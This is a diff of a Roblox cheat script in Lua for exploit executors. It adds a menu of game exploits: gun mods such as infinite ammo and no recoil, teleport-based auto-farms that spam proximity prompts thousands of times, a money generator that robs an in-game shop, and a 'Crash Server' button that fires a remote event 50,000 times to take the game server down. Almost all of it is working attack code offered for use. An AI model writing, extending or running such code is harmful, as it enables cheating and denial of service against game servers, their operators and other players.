-                repLabel.Size = UDim2.new(1, -20, 0.6, 0)
-                repLabel.Position = UDim2.new(0, 10, 0.05, 0)
-                repLabel.BackgroundTransparency = 1
-                repLabel.Text = "+0 REP"
-                repLabel.TextColor3 = Color3.fromRGB(100, 220, 255)
-                repLabel.Font = Enum.Font.GothamBold
-                repLabel.TextSize = 48
-                repLabel.TextStrokeTransparency = 0.5
-
-                local sub = Instance.new("TextLabel", frame)
-                sub.Size = UDim2.new(1, -20, 0.35, 0)
-                sub.Position = UDim2.new(0, 10, 0.62, 0)
-                sub.BackgroundTransparency = 1
-                sub.Text = "WIN REP🔝"
-                sub.TextColor3 = Color3.fromRGB(150, 200, 255)
-                sub.Font = Enum.Font.GothamSemibold
-                sub.TextSize = 16
-
-                levelUpText = Instance.new("TextLabel", repSg)
-                levelUpText.Name = "LevelUpText"
-                levelUpText.Size = UDim2.new(0, 400, 0, 80)
-                levelUpText.Position = UDim2.new(0.5, -200, 0.2, 0)
-                levelUpText.BackgroundTransparency = 1
-                levelUpText.Text = "⬆️ LEVEL UP ⬆️"
-                levelUpText.TextColor3 = Color3.fromRGB(255, 215, 0)
-                levelUpText.Font = Enum.Font.GothamBold
-                levelUpText.TextSize = 60
-                levelUpText.Visible = false
-                levelUpText.ZIndex = 1001
-
-                if repConn then repConn:Disconnect() end
-                repConn = repValue:GetPropertyChangedSignal("Value"):Connect(updateRepLabel)
-            end
-        end
-
-        local function pressW()
-            local vu = game:GetService("VirtualUser")
-            task.spawn(function()
-                for _ = 1, 5 do
-                    vu:CaptureController()
-                    vu:SetKeyDown("w")
-                    task.wait(0.05)
-                    vu:SetKeyUp("w")
-                    task.wait(0.05)
-                end
-            end)
-        end
-
-        local function resetCamera()
-            local re = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvents")
-            local camEv = re and re:FindFirstChild("CameraEvent")
-            if camEv then pcall(function() firesignal(camEv.OnClientEvent, "Reset") end) end
-        end
-
-        local function doFarm()
-            if not workspace:FindFirstChild("Beds") then return false end
-            local beds = workspace.Beds:GetChildren()
-            local valid = {}
-            for _, b in pairs(beds) do
-                if b:FindFirstChild("Interact") and b.Interact:FindFirstChild("ProximityPrompt") then
-                    table.insert(valid,
-                        b)
-                end
-            end
-            if #valid == 0 then return false end
-            local chosen = valid[math.random(1, #valid)]
-            local prompt = chosen.Interact.ProximityPrompt
-            local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
-            if not hrp then return false end
-
-            hrp.CFrame = chosen.Interact.CFrame + Vector3.new(0, 3, 0)
-            task.wait(0.3)
-
-            if useFireMethod then
-                for _ = 1, 2000 do
-                    if not BedToggled then break end
-                    task.spawn(function() pcall(function() fireproximityprompt(prompt) end) end)
-                end
-            else
-                prompt.HoldDuration = 0
-                prompt.MaxActivationDistance = 5
-                for _ = 1, 2000 do
-                    if not BedToggled then break end
-                    task.spawn(function()
-                        pcall(function()
-                            prompt:InputHoldBegin()
-                            task.wait(0.1)
-                            prompt:InputHoldEnd()
-                        end)
-                    end)
-                end
-            end
-            return true
-        end
-
-        local function stopFarm(bt)
-            BedToggled = false
-            BedStopping = true
-
-            NOTIFY("System", "Espere a que termine de recibir el nivel...", 5)
-
-            -- Wait for reputation to stop changing (4 seconds idle)
-            local lastRepChange = tick()
-            local conn
-            conn = repValue.Changed:Connect(function()
-                lastRepChange = tick()
-            end)
-
-            repeat task.wait(0.5) until tick() - lastRepChange > 4 or not BedStopping
-            if conn then conn:Disconnect() end
-
-            if repConn then
-                repConn:Disconnect(); repConn = nil
-            end
-            resetCamera()
-            pressW()
-            task.wait(10)
-            if LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") and initialCF then
-                LPLR.Character.HumanoidRootPart.CFrame = initialCF
-            end
-            removeScreen()
-            muteSounds(false)
-
-            BedStopping = false
-        end
-
-        local function startFarm()
-            -- [ STRICT BLOCKING ]
-            if string.find(executor, "Xeno") then
-                NOTIFY("Blocked", "Xeno is not supported for this user velocity", 7)
-                return
-            end
-
-            if string.find(executor, "Solara") then
-                NOTIFY("Blocked", "Solara is not supported for this user velocity", 7)
-                return
-            end
-
-            if not useFireMethod then
-                NOTIFY("Blocked", "Your executor does not support fireproximityprompt", 7)
-                return
-            end
-
-            BedToggled = true
-            farmStartTime = tick()
-            local char = LPLR.Character or LPLR.CharacterAdded:Wait()
-            local hrp = char:WaitForChild("HumanoidRootPart")
-            initialCF = hrp.CFrame
-            muteSounds(true)
-
-            -- Dynamic listener for new sounds
-            local SS = game:GetService("SoundService")
-            local PG = LPLR:WaitForChild("PlayerGui")
-            local function autoMute(v)
-                if BedToggled and v:IsA("Sound") then
-                    if not soundCache[v] then
-                        soundCache[v] = v.Volume
-                    end
-                    v.Volume = 0
-                end
-            end
-
-            local con1 = workspace.DescendantAdded:Connect(autoMute)
-            local con2 = SS.DescendantAdded:Connect(autoMute)
-            local con3 = PG.DescendantAdded:Connect(autoMute)
-
-            task.spawn(function()
-                repeat task.wait(0.5) until not BedToggled
-                con1:Disconnect()
-                con2:Disconnect()
-                con3:Disconnect()
-            end)
-
-            startNotifKiller()
-            lastRepValue = getCleanRep()
-            repAtStart = lastRepValue
-            levelUpDetected = false
-            makeScreen("72647550241860")
-            task.wait(2)
-            while BedToggled do
-                doFarm()
-                task.wait(1)
-            end
-        end
+        STYLE_MOD(ADD_TGL(D_MODS.SCR, "Infinite Ammo", WM.INF_AMMO, function(v)
+            WM.INF_AMMO = v
+            NOTIFY("GUN MODS", "Infinite Ammo: " .. (v and "ON" or "OFF"), 1.5)
+        end))
+        STYLE_MOD(ADD_TGL(D_MODS.SCR, "No Recoil", WM.NO_RECOIL, function(v)
+            WM.NO_RECOIL = v
+            NOTIFY("GUN MODS", "No Recoil: " .. (v and "ON" or "OFF"), 1.5)
+        end))
+        STYLE_MOD(ADD_TGL(D_MODS.SCR, "No Spread", WM.NO_SPREAD, function(v)
+            WM.NO_SPREAD = v
+            NOTIFY("GUN MODS", "No Spread: " .. (v and "ON" or "OFF"), 1.5)
+        end))
+        STYLE_MOD(ADD_TGL(D_MODS.SCR, "Rapid Fire", WM.RAPID_FIRE, function(v)
+            WM.RAPID_FIRE = v
+            NOTIFY("GUN MODS", "Rapid Fire: " .. (v and "ON" or "OFF"), 1.5)
+        end))
 
         -- [ ACTIONS CARD ]
         local C_ACTIONS = MK_CARD(TR, "Actions", "rbxassetid://87411082578223")
 
-        _G.TARGET_REP = 20000
-        ADD_SLD(C_ACTIONS, "Target Rep", 20000, 15000000, 20000, function(v)
-            _G.TARGET_REP = v
+        local function REJOIN()
+            pcall(function()
+                local ts = game:GetService("TeleportService")
+                ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, LPLR)
+            end)
+        end
+
+        local GEN_RUNNING = false
+        local L_GEN_BTN = ADD_BTN(C_ACTIONS, "Money gen: OFF", function(bt)
+            if GEN_RUNNING then return end
+
+            -- Auto Minimize UI
+            MAIN.Visible = false
+            NOTIFY("GEN", "Money Gen: UI Minimized for farming.", 2)
+
+            local function cleanM(s) return tonumber((s:gsub("%D", ""))) or 0 end
+            local curMoneyStr = LPLR.PlayerGui.MainScreen.Profile.CashAmount.Text
+            if cleanM(curMoneyStr) >= 5000000 then
+                NOTIFY("Money Gen", "You have $5M+. Spend it before using again!", 5)
+                return
+            end
+
+            GEN_RUNNING = true
+            bt.Text = "Money gen: RUNNING"
+
+            local startMoney = cleanM(curMoneyStr)
+            local startPos = LPLR.Character.HumanoidRootPart.CFrame
+
+            -- Mute per user request
+            local oldVols = {}
+            local function mute(v)
+                if v:IsA("Sound") and not oldVols[v] then
+                    oldVols[v] = v.Volume
+                    v.Volume = 0
+                end
+            end
+            local muteConn1 = game.DescendantAdded:Connect(mute)
+            for _, v in pairs(game:GetDescendants()) do pcall(mute, v) end
+
+            -- UI Overlay
+            local OVR = Instance.new("ScreenGui", CORE)
+            OVR.DisplayOrder = 999999
+            OVR.IgnoreGuiInset = true
+
+            local BLACK = Instance.new("Frame", OVR)
+            BLACK.Size = UDim2.new(1, 0, 1, 0)
+            BLACK.BackgroundColor3 = Color3.new(0, 0, 0)
+            BLACK.ZIndex = 1
+
+            local IMG = Instance.new("ImageLabel", OVR)
+            IMG.Size = UDim2.new(1, 0, 1, 0)
+            IMG.Image = "rbxassetid://72647550241860"
+            IMG.BackgroundTransparency = 1
+            IMG.ZIndex = 2
+            IMG.ScaleType = Enum.ScaleType.Crop
+
+            task.wait(1)
+
+            -- Farm Logic (Legacy spam for the crash effect)
+            BYPASS_TP(Vector3.new(1, 92, -68))
+            task.wait(0.5)
+
+            local Event = game:GetService("ReplicatedStorage").Events.ServerEvent
+            Event:FireServer("RobNPC", "Gio's Shop")
+
+            local activated = false
+            local sTime = tick()
+            while tick() - sTime < 11 do
+                pcall(function()
+                    local bag = workspace.Map.NPC:FindFirstChild("Gio's Shop")
+                    bag = bag and bag:FindFirstChild("BagPosition")
+                    bag = bag and bag:FindFirstChild("MoneyBag")
+                    local prompt = bag and bag:FindFirstChild("ProximityPrompt")
+
+                    if prompt then
+                        activated = true
+                        for _ = 1, 3500 do -- Increased spam for the crash
+                            task.spawn(function()
+                                pcall(fireproximityprompt, prompt)
+                            end)
+                        end
+                    end
+                end)
+                if activated then break end
+                task.wait(0.2)
+            end
+
+            if activated then
+                NOTIFY("MONEY GEN", "successful. Collecting money...", 4)
+                task.wait(8) -- Wait for server to process cash
+            else
+                NOTIFY("MONEY GEN", "Failed to start money generation!", 4)
+            end
+
+            -- Return to start position & cleanup
+            BYPASS_TP(startPos.Position)
+            LPLR.Character.HumanoidRootPart.CFrame = startPos
+            task.wait(2)
+            OVR:Destroy()
+            if muteConn1 then muteConn1:Disconnect() end
+            pcall(function()
+                for s, v in pairs(oldVols) do if s.Parent then s.Volume = v end end
+            end)
+            bt.Text = "Money gen: OFF"
+            GEN_RUNNING = false
         end)
 
-        local L_GEN_BTN = ADD_BTN(C_ACTIONS, "Level gen: OFF", function(bt)
-            if BedStopping then return end
-            if not BedToggled then
-                bt.Text = "Level gen: ON"
-                TWN(bt, { BackgroundColor3 = Color3.fromRGB(0, 180, 80) }, 0.2)
-                task.spawn(startFarm)
-                if MAIN then MAIN.Visible = false end
-            else
-                if _G.TARGET_REP and _G.TARGET_REP > 0 then
-                    NOTIFY("SYSTEM",
-                        "The farm will automatically rejoin\nonce you have reached the selected level.\nPlease wait.", 5)
-                    return
+        -- [[ SERVER UTILITIES ]]
+        local function ServerHop()
+            NOTIFY("SERVER", "Hopping to random public server...", 2.5)
+            pcall(function()
+                local x = {}
+                for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100")).data) do
+                    if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
+                        x[#x + 1] = v.id
+                    end
                 end
-
-                local elapsed = tick() - farmStartTime
-                if elapsed < minFarmDuration then
-                    local rem = math.ceil(minFarmDuration - elapsed)
-                    local oldT = bt.Text
-                    bt.Text = "WAIT " .. rem .. "s"
-                    TWN(bt, { BackgroundColor3 = Color3.fromRGB(150, 50, 50) }, 0.2)
-                    task.wait(1)
-                    bt.Text = oldT
-                    TWN(bt, { BackgroundColor3 = Color3.fromRGB(0, 180, 80) }, 0.2)
+                if #x > 0 then
+                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
                 else
-                    bt.Text = "Level gen: OFF"
-                    TWN(bt, { BackgroundColor3 = CFG.COL.BG }, 0.2)
-                    task.spawn(stopFarm, bt)
+                    NOTIFY("Server Hop", "No servers found!", 3)
                 end
+            end)
+        end
+
+        local function JoinLowest()
+            NOTIFY("SERVER", "Joining lowest player count server...", 2.5)
+            local servers = {}
+            local res = game:HttpGet("https://games.roblox.com/v1/games/" ..
+                game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
+            local data = game:GetService("HttpService"):JSONDecode(res).data
+            for _, v in ipairs(data) do
+                if v.playing < v.maxPlayers and v.id ~= game.JobId then
+                    table.insert(servers, v)
+                end
+            end
+            table.sort(servers, function(a, b) return a.playing < b.playing end)
+            if #servers > 0 then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[1].id)
+            else
+                NOTIFY("Server", "No other servers found!", 3)
+            end
+        end
+
+        ADD_BTN(C_ACTIONS, "Server Hop", ServerHop)
+
+        local HAS_CRASHED = false
+        ADD_BTN(C_ACTIONS, "Crash Server 💥", function()
+            if HAS_CRASHED then
+                NOTIFY("Crash", "Crassing in progress...", 3)
+                return
+            end
+            HAS_CRASHED = true
+
+            -- 1. Buy the Cubes
+            local Event = game:GetService("ReplicatedStorage").Events.ServerEvent
+            Event:FireServer(
+                "BuyItemTool",
+                "Cubes",
+                nil,
+                1
+            )
+
+            local Players = game:GetService("Players")
+            local LocalPlayer = Players.LocalPlayer
+
+            -- Wait slightly for the purchase to process and the tool to appear
+            task.wait(0.6)
+
+            local function getEvent()
+                local tool = LocalPlayer.Backpack:FindFirstChild("Cubes")
+                if tool then
+                    return tool:FindFirstChild("RemoteEvent")
+                end
+                return nil
+            end
+
+            local remoteEvent = getEvent()
+
+            if not remoteEvent then
+                warn("RemoteEvent not found. Make sure you have the object in the backpack.")
+                NOTIFY("Crash", "Cubes object not found. Try again.", 3)
+                HAS_CRASHED = false -- allow retry
+                return
+            end
+
+            NOTIFY("Crash", "Crashing server...", 4)
+
+            -- Spam
+            for _ = 1, 50000 do
+                task.spawn(function()
+                    pcall(function()
+                        remoteEvent:FireServer()
+                    end)
+                end)
             end
         end)
     end
     task.spawn(SETUP_TELEPORTS)
 
     local function SETUP_FARMS()
+        local LPLR = game:GetService("Players").LocalPlayer
         local FL, FR = ADD_SPLIT(P_FRM)
         FL.Parent.Size = UDim2.new(1, -10, 1, -10)
         FL.Parent.Position = UDim2.new(0, 5, 0, 5)
@@ -3862,1315 +4175,900 @@ local function BUILD_NYH_UI()
         RL.Padding = UDim.new(0, 10)
         RL.SortOrder = Enum.SortOrder.LayoutOrder
 
+        -- [[ HELPERS ]]
+        local function GET_PRP(folder, text)
+            for _, v in ipairs(folder:GetDescendants()) do
+                if v:IsA("ProximityPrompt") and (v.ActionText == text or v.ObjectText == text) then return v end
+            end
+            return nil
+        end
+
+        local function GET_TOOL(name)
+            local tool = LPLR.Backpack:FindFirstChild(name) or (LPLR.Character and LPLR.Character:FindFirstChild(name))
+            if tool then
+                tool.Parent = LPLR.Character; return tool
+            end
+            return nil
+        end
+
         local C1 = MK_CARD(FL, "Plant farm", "rbxassetid://126174660032876")
 
-        -- Farming Variables
-        local SelectedQuantity = 1
-        local FarmEnabled = false
-
-        local function GET_POT_STATUS(pot)
-            if not pot then return "NIL" end
-            local prompt = pot:FindFirstChild("Interact") and pot.Interact:FindFirstChildOfClass("ProximityPrompt") or
-                pot:FindFirstChild("Pot") and pot.Pot:FindFirstChild("Interact") and
-                pot.Pot.Interact:FindFirstChildOfClass("ProximityPrompt")
-            if not prompt or not prompt.Enabled then return "BUSY" end
-
-            local text = prompt.ActionText:upper()
-            if text:find("HARVEST") then
-                return "READY", prompt
-            elseif text:find("WATER") then
-                return "WATER", prompt
-            elseif text:find("PLANT") then
-                return "EMPTY", prompt
-            end
-
-            return "BUSY", prompt
-        end
-
-        local function GET_CASH()
-            local cashVal = 99999 -- Default to high to avoid blocking if HUD fails
-            pcall(function()
-                local label = game:GetService("Players").LocalPlayer.PlayerGui.HUD.Group.HotBar.Cash.CashNumber
-                local text = label.Text:gsub("[^%d%.-]", "")
-                local n = tonumber(text)
-                if n then cashVal = n end
-            end)
-            return cashVal
-        end
-
-        local function USE_PLANT_JUICE()
-            local player = game:GetService("Players").LocalPlayer
-            local backpack = player:WaitForChild("Backpack")
-            local char = player.Character or player.CharacterAdded:Wait()
-            local hum = char:FindFirstChildOfClass("Humanoid")
-            if not hum then
-                return false
-            end
-
-            local currentJuice = backpack:FindFirstChild("Plant Juice") or char:FindFirstChild("Plant Juice")
-
-            -- Check if we need to buy one
-            local needsBuying = false
-            if not currentJuice then
-                needsBuying = true
-            else
-                local uses = tonumber((currentJuice.ToolTip or ""):match("%d+")) or 0
-                if uses <= 0 then
-                    needsBuying = true
-                end
-            end
-
-            -- Buy if needed
-            if needsBuying then
-                NOTIFY("Farm", "Buying Plant Juice...", 2)
-                pcall(function()
-                    local remote = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-                    local juiceItem = SM_REF["Issac's Stock"].Misc
-                        ["Plant Juice"]
-                    remote:InvokeServer(juiceItem)
-                end)
-
-                currentJuice = nil
-                for _ = 1, 20 do
-                    task.wait(0.25)
-                    char = player.Character or player.CharacterAdded:Wait()
-                    currentJuice = backpack:FindFirstChild("Plant Juice") or char:FindFirstChild("Plant Juice")
-                    if currentJuice then
-                        break
-                    end
-                end
-            end
-
-            if not currentJuice then
-                NOTIFY("Farm", "Plant Juice not found!", 2)
-                return false
-            end
-
-            -- Proper equip flow (as verified)
-            hum:EquipTool(currentJuice)
-            task.wait(1)
-
-            char = player.Character or player.CharacterAdded:Wait()
-            local equipped = char:FindFirstChild("Plant Juice")
-
-            if equipped and equipped:FindFirstChild("ClickEvent") then
-                equipped.ClickEvent:FireServer(true)
-                task.wait(0.2)
-                -- Return to backpack after use
-                equipped.Parent = backpack
-                return true
-            end
-
-            NOTIFY("Farm", "Failed to equip/use Plant Juice!", 2)
-            return false
-        end
-
-        local CURRENT_FARM_MODE = "Simple"
-        local function DO_FARM_LOOP()
-            local to_plant = SelectedQuantity
-            local to_harvest = SelectedQuantity
-            local my_pots = {} -- Track only pots we planted in
-
-            -- 1. Buy seeds
-            NOTIFY("Farm", "Buying " .. to_plant .. " seeds...", 3)
-            pcall(function()
-                local remote = game:GetService("ReplicatedStorage").RemoteFunctions.StorePurchase
-                local seed = game:GetService("ReplicatedStorage").StoreMenus["Issac's Stock"].Misc.Seed
-                for i = 1, to_plant do
-                    if not FarmEnabled then break end
-                    remote:InvokeServer(seed)
-                    task.wait(0.3)
-                end
-            end)
-
-            -- 2. Farming Loop
-            while FarmEnabled and (to_plant > 0 or to_harvest > 0) do
-                local player = game.Players.LocalPlayer
-                local char = player.Character
-                local hrp = char and char:FindFirstChild("HumanoidRootPart")
-
-                if hrp then
-                    local container = workspace:FindFirstChild("BerryPots")
-                    if container then
-                        local children = container:GetChildren()
-                        local potRefs = {
-                            { idx = 23 }, { direct = "Pot" }, { idx = 19 }, { idx = 17 },
-                            { idx = 21 }, { idx = 20 }, { idx = 22 }, { idx = 18 }
-                        }
-
-                        -- 1. PLANTING PHASE
-                        if to_plant > 0 then
-                            NOTIFY("Farm", "Scanning " .. #potRefs .. " pots for planting...", 2)
-                            for _, data in ipairs(potRefs) do
-                                if not FarmEnabled or to_plant <= 0 then break end
-                                if not (char:FindFirstChild("Seed") or player.Backpack:FindFirstChild("Seed")) then break end
-
-                                local pot = data.idx and children[data.idx] or container:FindFirstChild(data.direct)
-                                if pot then
-                                    if not my_pots[pot] then
-                                        local status, prompt = GET_POT_STATUS(pot)
-                                        if status == "EMPTY" then
-                                            NOTIFY("Farm", "Empty pot found! Teleporting...", 1.5)
-                                            BYPASS_TP(pot:GetPivot().Position)
-                                            task.wait(0.3)
-
-                                            -- Step 1: Plant
-                                            fireproximityprompt(prompt)
-                                            NOTIFY("Farm", "Planting seed...", 1)
-
-                                            -- Step 2: Wait for it to become "WATER THE SOIL"
-                                            local s1 = tick()
-                                            local watered = false
-                                            repeat
-                                                task.wait(0.1)
-                                                local currentStatus = GET_POT_STATUS(pot)
-                                                if currentStatus == "WATER" then
-                                                    watered = true
-                                                end
-                                            until watered or not FarmEnabled or tick() - s1 > 4
-
-                                            if FarmEnabled and watered then
-                                                local _, p2 = GET_POT_STATUS(pot)
-                                                fireproximityprompt(p2)
-                                                NOTIFY("Farm", "Watered!", 1)
-
-                                                if CURRENT_FARM_MODE == "Simple + Plant Juice" then
-                                                    task.wait(0.2)
-                                                    if USE_PLANT_JUICE() then
-                                                        NOTIFY("Farm", "Plant Juice applied!", 1.5)
-                                                    end
-                                                end
-
-                                                my_pots[pot] = true
-                                                to_plant = to_plant - 1
-
-                                                -- Wait 5.6 seconds before moving to next pot
-                                                task.wait(5.6)
-                                            end
-                                        end
-                                    end
-                                else
-                                    NOTIFY("Farm Debug", "Pot not found! Index: " .. tostring(data.idx or "N/A"), 2)
-                                end
-                            end
-                        end
-
-                        -- 2. HARVESTING PHASE (Only check OUR pots)
-                        if to_harvest > 0 then
-                            for pot, is_mine in pairs(my_pots) do
-                                if not FarmEnabled or to_harvest <= 0 then break end
-                                if is_mine then
-                                    local status, prompt = GET_POT_STATUS(pot)
-                                    if status == "READY" then
-                                        NOTIFY("Farm", "Pot ready! Harvesting...", 1.5)
-                                        BYPASS_TP(pot:GetPivot().Position)
-                                        task.wait(0.3)
-                                        fireproximityprompt(prompt)
-                                        NOTIFY("Farm", "Harvested! (" .. to_harvest .. " left)", 9)
-
-                                        my_pots[pot] = nil -- Done with this pot
-                                        to_harvest = to_harvest - 1
-                                        task.wait(9)       -- Animation buffer per user request
-                                    end
-                                end
-                            end
-                        end
-                    else
-                        NOTIFY("Farm Debug", "CONTAINER 'BerryPots' NOT FOUND IN WORKSPACE!", 5)
-                        task.wait(1)
-                    end
-                else
-                    task.wait(1)
-                end
-                task.wait(1)
-            end
-
-            NOTIFY("Farm", "Session finished!", 3)
-            FarmEnabled = false
-            -- Note: Toggle UI state will reset if user refreshes or we find a way to update it.
-        end
-
-        ADD_TGL(C1, "Auto Plant", false, function(v)
-            FarmEnabled = v
-            NOTIFY("Farm", "Auto Plant is now: " .. (v and "ENABLED" or "DISABLED"), 3)
-            if v then
-                task.spawn(DO_FARM_LOOP)
-            end
-        end)
-
-        local DRP_OPT = ADD_DRP(C1, "avaliable pots", function(v)
-            SelectedQuantity = tonumber(v) or 1
-            NOTIFY("Farm", "Quantity set to: " .. SelectedQuantity, 2)
-        end)
-
-        local DRP = ADD_DRP(C1, "Farm Mode: Simple", function(v)
-            if v == "Simple + Plant Juice" then
-                if GET_CASH() < 10000 then
-                    NOTIFY("Farm", "Balance low (<10k)? Proceeding anyway...", 2)
-                end
-            end
-            CURRENT_FARM_MODE = v
-            NOTIFY("Farm", "Mode: " .. v .. " Active", 2)
-        end)
-        DRP.REFRESH({ "Simple", "Simple + Plant Juice" })
-
-        -- Real-time Counting for Pots
-        task.spawn(function()
-            local potRefs = {
-                { idx = 23 }, { direct = "Pot" }, { idx = 19 }, { idx = 17 },
-                { idx = 21 }, { idx = 20 }, { idx = 22 }, { idx = 18 }
-            }
-
-            local lastCount = -1
-            while task.wait(0.5) do
-                local currentCount = 0
-                local container = workspace:FindFirstChild("BerryPots")
-
-                if container then
-                    local children = container:GetChildren()
-                    for _, data in ipairs(potRefs) do
-                        local pot = data.idx and children[data.idx] or container:FindFirstChild(data.direct)
-                        if pot then
-                            local s = GET_POT_STATUS(pot)
-                            if s == "EMPTY" then
-                                currentCount = currentCount + 1
-                            end
-                        end
-                    end
-                end
-
-                if currentCount ~= lastCount and DRP_OPT then
-                    lastCount = currentCount
-                    local potList = {}
-                    for i = 1, currentCount do
-                        table.insert(potList, tostring(i))
-                    end
-                    DRP_OPT.REFRESH(potList)
-                end
-            end
-        end)
-
-        local function findPromptFor(sellerName)
-            local ps = workspace:FindFirstChild("PackSelling")
-            if not ps then return nil end
-            local model = ps:FindFirstChild(sellerName, true)
-            if model then
-                return model:FindFirstChildWhichIsA("ProximityPrompt", true)
-            end
-            return nil
-        end
-
-        ADD_BTN(C1, "Sell Current Item", function()
-            local char = game:GetService("Players").LocalPlayer.Character
-            if not (char and char:FindFirstChildOfClass("Tool")) then
-                NOTIFY("Farm", "Equip something before selling!", 3)
-                return
-            end
-
-            local pookiePrompt = findPromptFor("Pookie")
-            local danPrompt = findPromptFor("Dan")
-
-            local pookieActive = pookiePrompt and pookiePrompt.Enabled or false
-            local danActive = danPrompt and danPrompt.Enabled or false
-
-            local Event = game:GetService("ReplicatedStorage"):FindFirstChild("RemoteEvents") and
-                game:GetService("ReplicatedStorage").RemoteEvents:FindFirstChild("PackSell")
-
-            if not Event then return end
-
-            if pookieActive and danActive then
-                -- Vender a uno aleatorio si ambos están activos
-                if math.random() > 0.5 then
-                    task.spawn(function() Event:FireServer("Pookie") end)
-                    NOTIFY("Farm", "Selling to Pookie...", 2)
-                else
-                    task.spawn(function() Event:FireServer("Dan") end)
-                    NOTIFY("Farm", "Selling to Dan...", 2)
-                end
-            elseif pookieActive then
-                task.spawn(function() Event:FireServer("Pookie") end)
-                NOTIFY("Farm", "Selling to Pookie...", 2)
-            elseif danActive then
-                task.spawn(function() Event:FireServer("Dan") end)
-                NOTIFY("Farm", "Selling to Dan...", 2)
-            else
-                NOTIFY("Farm", "Neither Pookie nor Dan is active!", 3)
-            end
-        end)
-
-        -- [[ LUCAS FARM (LITERAL Sellv1.lua) ]]
-        local LPLR = game:GetService("Players").LocalPlayer
-        local WS = game:GetService("Workspace")
-        local RS = game:GetService("ReplicatedStorage")
-        local VEHICLE_NAME = "Vapid Speedo (Pack Courier)"
-        local MAX_PRODUCT_LIMIT = 20
-        local DRUG_NAMES = {
-            "Goldberry Pack",
-            "Blueberry Pack",
-            "Raspberry Pack",
-            "Blackberry Pack"
+        -- [[ PLANT FARM DATA ]]
+        local SEEDS = {
+            ["Blackberry ($1,500)"] = "Blackberry Seed",
+            ["Raspberry ($500)"] = "Raspberry Seed",
+            ["Strawberry ($6,500)"] = "Strawberry Seed",
+            ["Blueberry ($3,000)"] = "Blueberry Seed"
         }
 
-        local function getVehicleObject()
-            local pd = RS:FindFirstChild("PlayerData")
-            local pData = pd and pd:FindFirstChild(LPLR.Name)
-            local stats = pData and pData:FindFirstChild("Statistics")
-            local vehicles = stats and stats:FindFirstChild("Vehicles")
-            return vehicles and vehicles:FindFirstChild(VEHICLE_NAME)
-        end
+        local PLOT_VECTORS = {
+            Vector3.new(1537.79, 105.92, 2766.60), Vector3.new(1541.13, 105.92, 2766.59), Vector3.new(1544.73, 105.92,
+            2766.70),
+            Vector3.new(1548.26, 105.92, 2766.76), Vector3.new(1551.90, 105.92, 2766.98), Vector3.new(1528.33, 105.92,
+            2769.54),
+            Vector3.new(1528.12, 105.92, 2773.44), Vector3.new(1530.87, 105.92, 2776.16), Vector3.new(1533.86, 105.92,
+            2776.21),
+            Vector3.new(1536.92, 105.92, 2776.14), Vector3.new(1540.05, 105.92, 2776.17), Vector3.new(1542.78, 105.92,
+            2776.40),
+            Vector3.new(1545.60, 105.92, 2776.52), Vector3.new(1548.92, 105.92, 2776.53), Vector3.new(1552.15, 105.92,
+            2776.57),
+            Vector3.new(1555.72, 105.82, 2776.66), Vector3.new(1556.33, 109.45, 2753.81), Vector3.new(1552.68, 109.45,
+            2753.92),
+            Vector3.new(1549.34, 109.45, 2754.11), Vector3.new(1545.74, 109.45, 2754.19), Vector3.new(1542.21, 109.45,
+            2754.31),
+            Vector3.new(1538.56, 109.45, 2754.29), Vector3.new(1561.98, 109.45, 2750.49), Vector3.new(1561.97, 109.45,
+            2746.59),
+            Vector3.new(1559.09, 109.45, 2744.01), Vector3.new(1556.10, 109.45, 2744.12), Vector3.new(1553.05, 109.45,
+            2744.36),
+            Vector3.new(1549.92, 109.45, 2744.48), Vector3.new(1547.18, 109.45, 2744.40), Vector3.new(1544.36, 109.45,
+            2744.42),
+            Vector3.new(1541.05, 109.45, 2744.59), Vector3.new(1537.81, 109.45, 2744.71), Vector3.new(1534.25, 109.35,
+            2744.81),
+            Vector3.new(1515.81, 107.11, 2676.36), Vector3.new(1515.99, 107.11, 2680.02), Vector3.new(1516.23, 107.11,
+            2683.35),
+            Vector3.new(1516.38, 107.11, 2686.95), Vector3.new(1516.56, 107.11, 2690.47), Vector3.new(1516.60, 107.11,
+            2694.12),
+            Vector3.new(1512.40, 107.11, 2670.78), Vector3.new(1508.49, 107.11, 2670.85), Vector3.new(1506.53, 107.11,
+            2673.94),
+            Vector3.new(1506.50, 107.11, 2676.87), Vector3.new(1506.42, 107.11, 2679.81), Vector3.new(1506.60, 107.11,
+            2682.94),
+            Vector3.new(1506.57, 107.11, 2685.68), Vector3.new(1506.64, 107.11, 2688.50), Vector3.new(1506.86, 107.11,
+            2691.81),
+            Vector3.new(1507.04, 107.11, 2695.04), Vector3.new(1507.20, 107.01, 2698.60), Vector3.new(1556.38, 106.08,
+            2655.22),
+            Vector3.new(1553.03, 106.08, 2656.70), Vector3.new(1550.00, 106.08, 2658.12), Vector3.new(1546.69, 106.08,
+            2659.54),
+            Vector3.new(1543.47, 106.08, 2660.98), Vector3.new(1540.08, 106.08, 2662.32), Vector3.new(1560.37, 106.08,
+            2650.03),
+            Vector3.new(1558.90, 106.08, 2646.41), Vector3.new(1555.26, 106.08, 2645.11), Vector3.new(1552.53, 106.08,
+            2646.33),
+            Vector3.new(1549.79, 106.08, 2647.69), Vector3.new(1546.93, 106.08, 2648.98), Vector3.new(1544.37, 106.08,
+            2649.93),
+            Vector3.new(1541.76, 106.08, 2651.01), Vector3.new(1538.75, 106.08, 2652.40), Vector3.new(1535.80, 106.08,
+            2653.73),
+            Vector3.new(1532.53, 105.98, 2655.16), Vector3.new(-807.30, 52.60, -54.58), Vector3.new(-803.92, 52.60,
+            -54.58),
+            Vector3.new(-800.55, 52.60, -54.58), Vector3.new(-797.26, 52.60, -54.58), Vector3.new(-794.17, 52.60, -54.58),
+            Vector3.new(-794.17, 52.60, -49.99), Vector3.new(-794.17, 52.60, -46.59), Vector3.new(1403.73, 141.15, 38.04),
